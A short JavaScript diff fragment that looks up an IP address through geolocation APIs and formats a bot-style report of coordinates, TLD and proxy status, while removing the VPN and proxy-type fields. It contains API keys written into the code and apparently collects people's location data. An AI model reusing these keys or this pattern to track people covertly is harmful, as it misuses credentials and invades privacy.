@@ -124,10 +124,7 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
 fetch('https://api.ip2location.io/?key=845094BBD7FCAE829B7D6AF3AE13FC02&ip=' + ip + '')
   .then(response => response.json())
   .then(data => {
-    let isVPN = data.proxy && data.proxy.is_vpn;
     let isProxy = data.is_proxy;
-    let isProxyType = data.proxy && data.proxy.proxy_type;
-    let isWebProxy = data.proxy && data.proxy.is_web_proxy;
       
         const message = `
 *🔎 ip*
@@ -141,10 +138,7 @@ fetch('https://api.ip2location.io/?key=845094BBD7FCAE829B7D6AF3AE13FC02&ip=' + i
 *├ Coordinates: ${longitude} ${latitude},*
 *├ TLD: ${tld}*
 *├ Version: ${versian}*
-*├ Vpn: ${isVPN}*
 *├ Proxy: ${isProxy}*
-*├ Type: ${isProxyType}*
-*├ Web proxy: ${isWebProxy}*
 *└ Internet: ${TypeInternet}*
 
     
